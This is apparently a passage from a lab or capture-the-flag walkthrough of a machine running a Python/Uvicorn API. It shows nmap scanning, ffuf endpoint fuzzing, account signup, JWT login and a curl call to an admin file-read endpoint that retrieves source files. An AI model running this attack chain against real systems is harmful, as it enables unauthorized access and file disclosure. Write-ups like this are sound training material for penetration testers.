First, we send an ICMP ping to check if the target machine is active.

The TTL value of 63 indicates that we are interacting with a Linux operating system (close to TTL 64).

Now, let's scan for open ports using Nmap:

sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.227.148 -oG allPorts

We discover open ports 22 (SSH) and 80 (HTTP):

Next, we launch service detection scripts on the discovered ports:

nmap -p22,80 -sCV 10.129.227.148 -oN targeted

Output details:

Wappalyzer highlights Uvicorn and Python as web technologies running on the target application:

We run directory fuzzing using ffuf:

ffuf -c -mc 200 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.129.227.148/FUZZ

We receive a 200 OK status code response for api and docs endpoints.

Navigating to http://10.129.227.148/api/v1 reveals the endpoints /user and /admin. Accessing /user returns Not Found, while /admin responds with Not authenticated.

We enumerate the user endpoint further:

ffuf -c -fc 404 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.129.227.148/api/v1/user/FUZZ

Fuzzing numerical IDs yields status 200 responses, with identifiers 01 and 1 returning a specific response length of 141 characters:

We save the response content locally:

curl -s -X GET "http://10.129.227.148/api/v1/user/1" | jq | tee user_admin

Checking for other HTTP methods using POST fuzzing:

ffuf -c -mc 422 -X POST -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.129.227.148/api/v1/user/FUZZ

This discloses login and signup routes returning HTTP status 422 (Unprocessable Entity).

Inspecting endpoint requirements:

curl -s -X GET "http://10.129.227.148/api/v1/user/login" | jq | tee login_r
curl -s -X GET "http://10.129.227.148/api/v1/user/signup" | jq | tee signup_r

Sending form data returns a validation error requiring JSON format. We register a new user account by transmitting JSON data:

curl -s -X POST http://10.129.227.148/api/v1/user/signup -H "Content-Type: application/json" -d '{"email":"d1o@d1o.com", "password":"test123"}' | jq

The server responds with {}, confirming successful user creation.

Next, we authenticate via the login endpoint:

curl -s -X POST http://10.129.227.148/api/v1/user/login -d 'username=d1o@d1o.com&password=test123' | jq

We obtain a JSON Web Token (JWT) access token.

The exposed path points to /home/htb/uhc/app/main.py. We download source files locally:

curl -X 'POST' \
  'http://10.129.227.148/api/v1/admin/file' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <ADMIN_JWT>' \
  -H 'Content-Type: application/json' \

Inspecting main.py reveals an internal module import from app.core.config. We retrieve config.py:
